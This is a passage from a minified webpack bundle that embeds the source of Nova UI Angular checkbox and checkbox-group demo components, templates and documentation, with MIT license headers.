selector: "nui-checkbox-group-justified-example",\n    templateUrl: "./checkbox-group-justified.example.component.html",\n})\nexport class CheckboxGroupJustifiedExampleComponent {\n    public cabbage = $localize`Cabbage`;\n    public potato = $localize`Potato`;\n    public tomato = $localize`Tomato`;\n    public carrot = $localize`Carrot`;\n    public vegetables = [this.cabbage, this.potato, this.tomato, this.carrot];\n    public hints = [this.cabbage, this.tomato];\n    public selectedVegetables = [this.potato, this.tomato];\n\n    constructor() {}\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n}\n'},742:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container d-flex">\n    <div class="d-flex flex-column mr-5">\n        <nui-checkbox-group\n            id="nui-demo-checkbox-group-basic"\n            name="vegetable"\n            [values]="selectedVegetables"\n        >\n            <nui-checkbox\n                *ngFor="let vegetable of vegetables"\n                [value]="vegetable"\n                hint="This is some help text"\n                [checked]="isChecked(vegetable)"\n            >\n                {{ vegetable }}\n            </nui-checkbox>\n            <nui-checkbox\n                hint="If it\'s not disabled ring the alarm!"\n                id="nui-demo-checkbox-group-1-disabled-checkbox"\n                [value]="disabledOne"\n                [checked]="!isChecked(disabledOne)"\n                disabled="true"\n                >{{ disabledOne }}</nui-checkbox\n            >\n        </nui-checkbox-group>\n    </div>\n    <div class="d-flex flex-column mt-5">\n        <nui-checkbox-group\n            id="nui-demo-checkbox-group-justified"\n            name="vegetable"\n            [values]="selectedVegetables"\n        >\n            <nui-checkbox\n                *ngFor="let vegetable of vegetables"\n                [value]="vegetable"\n                [hint]="\n                    hints.indexOf(vegetable) >= 0\n                        ? hints[hints.indexOf(vegetable)]\n                        : null\n                "\n                [checked]="isChecked(vegetable)"\n                class="nui-checkbox--justified"\n            >\n                {{ vegetable }}\n            </nui-checkbox>\n        </nui-checkbox-group>\n    </div>\n    <div class="d-flex flex-column mt-5">\n        <form [formGroup]="testForm">\n            <nui-checkbox-group\n                id="nui-demo-checkbox-group-in-form-disabled-checkboxes"\n                name="vegetable"\n                formControlName="checkboxGroup2"\n            >\n                <nui-checkbox\n                    [value]="vegetables[0]"\n                    [disabled]="true"\n                    [checked]="isChecked(vegetables[0])"\n                >\n                    {{ vegetables[0] }}</nui-checkbox\n                >\n                <nui-checkbox\n                    [value]="vegetables[1]"\n                    [disabled]="false"\n                    [checked]="isChecked(vegetables[1])"\n                >\n                    {{ vegetables[1] }}</nui-checkbox\n                >\n                <nui-checkbox\n                    [value]="vegetables[2]"\n                    [disabled]="true"\n                    [checked]="isChecked(vegetables[2])"\n                >\n                    {{ vegetables[2] }}</nui-checkbox\n                >\n                <nui-checkbox\n                    [value]="vegetables[3]"\n                    [disabled]="false"\n                    [checked]="isChecked(vegetables[3])"\n                >\n                    {{ vegetables[3] }}</nui-checkbox\n                >\n            </nui-checkbox-group>\n        </form>\n    </div>\n    <div class="d-flex flex-column mr-5">\n        <nui-checkbox-group-in-form-example\n            id="nui-demo-checkbox-group-part-of-form"\n        ></nui-checkbox-group-in-form-example>\n    </div>\n</div>\n'},20594:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder } from "@angular/forms";\n\n@Component({\n    selector: "nui-checkbox-group-test-example",\n    templateUrl: "checkbox-group-test.component.html",\n})\nexport class CheckboxGroupTestComponent {\n    public cabbage = "Cabbage";\n    public potato = "Potato";\n    public tomato = "Tomato";\n    public carrot = "Carrot";\n    public disabledOne = "DISABLED";\n    public vegetables = [this.cabbage, this.potato, this.tomato, this.carrot];\n    public hints = [this.cabbage, this.tomato];\n    public selectedVegetables = [this.potato, this.tomato, this.disabledOne];\n    public testForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.testForm = this.formBuilder.group({\n            checkboxGroup: this.formBuilder.control({\n                value: this.selectedVegetables,\n                disabled: true,\n            }),\n            checkboxGroup2: this.formBuilder.control({\n                value: this.selectedVegetables,\n                disabled: false,\n            }),\n        });\n    }\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n}\n'},80286:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic Checkbox-Group with Hint Text</h3>\n            <nui-checkbox-group\n                id="nui-demo-checkbox-group-basic"\n                name="vegetable"\n                [values]="selectedVegetables"\n            >\n                <nui-checkbox\n                    *ngFor="let vegetable of vegetables"\n                    [value]="vegetable"\n                    hint="This is some help text"\n                    [checked]="isChecked(vegetable)"\n                >\n                    {{ vegetable }}\n                </nui-checkbox>\n                <nui-checkbox\n                    hint="If it\'s not disabled ring the alarm!"\n                    id="nui-demo-checkbox-group-1-disabled-checkbox"\n                    [value]="disabledOne"\n                    [checked]="!isChecked(disabledOne)"\n                    disabled="true"\n                    >{{ disabledOne }}</nui-checkbox\n                >\n            </nui-checkbox-group>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Inline Checkbox-Group</h3>\n            <nui-checkbox-group\n                id="nui-demo-checkbox-group-inline"\n                class="nui-checkbox-group-inline"\n                [values]="selectedVegetables"\n                name="vegetable"\n            >\n                <nui-checkbox\n                    *ngFor="let vegetable of vegetables"\n                    [value]="vegetable"\n                >\n                    {{ vegetable }}\n                </nui-checkbox>\n            </nui-checkbox-group>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Justified Checkbox-Group</h3>\n            <nui-checkbox-group\n                id="nui-demo-checkbox-group-justified"\n                name="vegetable"\n                [values]="selectedVegetables"\n            >\n                <nui-checkbox\n                    *ngFor="let vegetable of vegetables"\n                    [value]="vegetable"\n                    [checked]="isChecked(vegetable)"\n                    class="nui-checkbox--justified"\n                >\n                    {{ vegetable }}\n                </nui-checkbox>\n            </nui-checkbox-group>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Disabled checkboxes within the form</h3>\n            <form [formGroup]="testForm">\n                <nui-checkbox-group\n                    id="nui-demo-checkbox-group-in-form-disabled-checkboxes"\n                    name="vegetable"\n                    formControlName="enabledCheckboxGroup"\n                >\n                    <nui-checkbox\n                        [value]="vegetables[0]"\n                        [disabled]="true"\n                        [checked]="isChecked(vegetables[0])"\n                    >\n                        {{ vegetables[0] }}</nui-checkbox\n                    >\n                    <nui-checkbox\n                        [value]="vegetables[1]"\n                        [disabled]="false"\n                        [checked]="isChecked(vegetables[1])"\n                    >\n                        {{ vegetables[1] }}</nui-checkbox\n                    >\n                    <nui-checkbox\n                        [value]="vegetables[2]"\n                        [disabled]="true"\n                        [checked]="isChecked(vegetables[2])"\n                    >\n                        {{ vegetables[2] }}</nui-checkbox\n                    >\n                    <nui-checkbox\n                        [value]="vegetables[3]"\n                        [disabled]="false"\n                        [checked]="isChecked(vegetables[3])"\n                    >\n                        {{ vegetables[3] }}</nui-checkbox\n                    >\n                </nui-checkbox-group>\n            </form>\n        </div>\n    </div>\n    <div class="d-flex flex-column mt-5">\n        <h3>Disabled checkboxes within the disabled form</h3>\n        <form [formGroup]="testForm">\n            <nui-checkbox-group\n                id="nui-demo-checkbox-group-in-form"\n                name="vegetable"\n                formControlName="disabledCheckboxGroup"\n            >\n                <nui-checkbox\n                    *ngFor="let vegetable of vegetables"\n                    [value]="vegetable"\n                    [checked]="isChecked(vegetable)"\n                >\n                    {{ vegetable }}\n                </nui-checkbox>\n            </nui-checkbox-group>\n        </form>\n    </div>\n</div>\n'},30586:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder } from "@angular/forms";\n\n@Component({\n    selector: "nui-checkbox-group-visual-test",\n    templateUrl: "./checkbox-group-visual-test.component.html",\n})\nexport class CheckboxGroupVisualTestComponent {\n    public cabbage = "Cabbage";\n    public potato = "Potato";\n    public tomato = "Tomato";\n    public carrot = "Carrot";\n    public disabledOne = "DISABLED";\n    public vegetables = [this.cabbage, this.potato, this.tomato, this.carrot];\n    public selectedVegetables = [this.potato, this.tomato, this.disabledOne];\n    public testForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.testForm = this.formBuilder.group({\n            checkboxGroup: this.formBuilder.control({\n                value: this.selectedVegetables,\n                disabled: true,\n            }),\n            checkboxGroup2: this.formBuilder.control({\n                value: this.selectedVegetables,\n                disabled: false,\n            }),\n        });\n    }\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n}\n'},84935:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiDocsModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { CheckboxGroupTestComponent } from "./checkbox-group-test/checkbox-group-test.component";\nimport {\n    CheckboxGroupBasicExampleComponent,\n    CheckboxGroupExampleComponent,\n    CheckboxGroupInFormExampleComponent,\n    CheckboxGroupInlineExampleComponent,\n    CheckboxGroupJustifiedExampleComponent,\n    CheckboxGroupVisualTestComponent,\n} from "./index";\n\nconst routes = [\n    {\n        path: "",\n        component: CheckboxGroupExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "checkbox-group-visual-test",\n        component: CheckboxGroupVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "checkbox-group-test",\n        component: CheckboxGroupTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiCheckboxModule,\n        NuiDocsModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiButtonModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        CheckboxGroupExampleComponent,\n        CheckboxGroupInlineExampleComponent,\n        CheckboxGroupInFormExampleComponent,\n        CheckboxGroupBasicExampleComponent,\n        CheckboxGroupVisualTestComponent,\n        CheckboxGroupJustifiedExampleComponent,\n        CheckboxGroupTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: "checkbox-group",\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class CheckboxGroupModule {}\n'},53380:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./checkbox-group-docs/checkbox-group-docs.example.component";\nexport * from "./checkbox-group-inline/checkbox-group-inline.example.component";\nexport * from "./checkbox-group-basic/checkbox-group-basic.example.component";\nexport * from "./checkbox-group-in-form/checkbox-group-in-form.example.component";\nexport * from "./checkbox-group-visual-test/checkbox-group-visual-test.component";\nexport * from "./checkbox-group-justified/checkbox-group-justified.example.component";\nexport * from "./checkbox-group-test/checkbox-group-test.component";\n'},72194:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox\n    id="nui-demo-checkbox-basic"\n    [checked]="true"\n    [required]="true"\n></nui-checkbox>\n'},45854:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-checkbox-basic-example",\n    templateUrl: "./checkbox-basic.example.component.html",\n})\nexport class CheckboxBasicExampleComponent {}\n'},52060:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox\n    id="nui-demo-checkbox-disabled"\n    [checked]="true"\n    [disabled]="true"\n    i18n\n>\n    Disabled\n</nui-checkbox>\n'},2092:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-checkbox-disabled-example",\n    templateUrl: "./checkbox-disabled.example.component.html",\n})\nexport class CheckboxDisabledExampleComponent {}\n'},6e4:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiCheckboxModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    <code>&lt;nui-checkbox&gt;</code> is a basic multi-select input component.\n    Use the <code>checked</code> input to control the checkbox state. Use the\n    <code>value</code> input to associate a value with the checkbox as part of\n    form.\n</p>\n<nui-example-wrapper filenamePrefix="checkbox-basic" exampleTitle="Basic Usage">\n    <nui-checkbox-basic-example></nui-checkbox-basic-example>\n</nui-example-wrapper>\n\n<h2>Help Hint</h2>\n<p>\n    Use the <code>hint</code> input to display a help hint beneath the checkbox\n    label.\n</p>\n<nui-example-wrapper\n    filenamePrefix="checkbox-helphint"\n    exampleTitle="Help Hint"\n>\n    <nui-checkbox-helphint-example></nui-checkbox-helphint-example>\n</nui-example-wrapper>\n\n<h2>Disabled</h2>\n<p>\n    Use the <code>disabled</code> input to control the checkbox disabled state.\n</p>\n<nui-example-wrapper filenamePrefix="checkbox-disabled" exampleTitle="Disabled">\n    <nui-checkbox-disabled-example></nui-checkbox-disabled-example>\n</nui-example-wrapper>\n\n<h2>Indeterminate</h2>\n<p>\n    Use the <code>indeterminate</code> input to set the checkbox state to\n    indeterminate.\n</p>\n<nui-example-wrapper\n    filenamePrefix="checkbox-indeterminate"\n    exampleTitle="Indeterminate"\n>\n    <nui-checkbox-indeterminate-example></nui-checkbox-indeterminate-example>\n</nui-example-wrapper>\n<h2>Value Change Output</h2>\n<p>\n    Use the <code>valueChange</code> output to track changes in value of\n    checkbox.\n</p>\n<nui-example-wrapper filenamePrefix="checkbox-output" exampleTitle="Output">\n    <nui-checkbox-output-example></nui-checkbox-output-example>\n</nui-example-wrapper>\n\n<h2>Part of Form</h2>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Make sure</strong> you\'re using the\n    <code>Validators.requiredTrue</code> validation for single checkbox in forms\n    (not checkbox group). The <code>Validators.required</code> won\'t work for\n    them.\n</nui-message>\n<p><code>&lt;nui-checkbox&gt;</code> can be used in reactive forms.</p>\n<nui-example-wrapper filenamePrefix="checkbox-in-form" exampleTitle="In a Form">\n    <nui-checkbox-in-form-example></nui-checkbox-in-form-example>\n</nui-example-wrapper>\n'},65792:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-checkbox-docs-example",\n    templateUrl: "./checkbox-docs.example.component.html",\n})\nexport class CheckboxExampleComponent {}\n'},47520:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox\n    id="nui-demo-checkbox"\n    i18n-hint\n    hint="This is some help text"\n    [required]="true"\n    [checked]="false"\n    i18n\n>\n    Check box with help text\n</nui-checkbox>\n'},71392:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-checkbox-helphint-example",\n    templateUrl: "./checkbox-helphint.example.component.html",\n})\nexport class CheckboxHelpHintExampleComponent {}\n'},77154:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="myForm" (submit)="onSubmit()">\n    <div class="form-group">\n        <nui-checkbox\n            name="nui-checkbox-validation-example"\n            formControlName="checkbox"\n            required\n            i18n\n        >\n            Validation\n        </nui-checkbox>\n    </div>\n    <button\n        nui-button\n        type="submit"\n        [disabled]="myForm.controls[\'checkbox\'].invalid"\n        i18n\n    >\n        Submit\n    </button>\n</form>\n'},95102:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport {\n    FormBuilder,\n    FormControl,\n    FormGroup,\n    Validators,\n} from "@angular/forms";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-checkbox-in-form-example",\n    templateUrl: "./checkbox-in-form.example.component.html",\n})\nexport class CheckboxInFormExampleComponent implements OnInit {\n    public myForm: FormGroup<{ checkbox: FormControl<boolean | null> }>;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        private toastService: ToastService\n    ) {}\n\n    public ngOnInit(): void {\n        this.myForm = this.formBuilder.group({\n            checkbox: [false, Validators.requiredTrue],\n        });\n    }\n\n    public onSubmit(): void {\n        this.toastService.success({ message: $localize`Your form is valid!` });\n    }\n}\n'},13356:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox\n    id="nui-demo-checkbox-indeterminate"\n    [indeterminate]="isIndeterminate"\n    [value]="isIndeterminate"\n    i18n\n>\n    I\'m not so sure...\n</nui-checkbox>\n'},46556:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-checkbox-indeterminate-example",\n    templateUrl: "./checkbox-indeterminate.example.component.html",\n})\nexport class CheckboxIndeterminateExampleComponent {\n    public isIndeterminate = true;\n}\n'},49904:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox [checked]="false">\n    <a (click)="action()" i18n> Custom link (anchor) action </a>\n</nui-checkbox>\n'},30096:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE 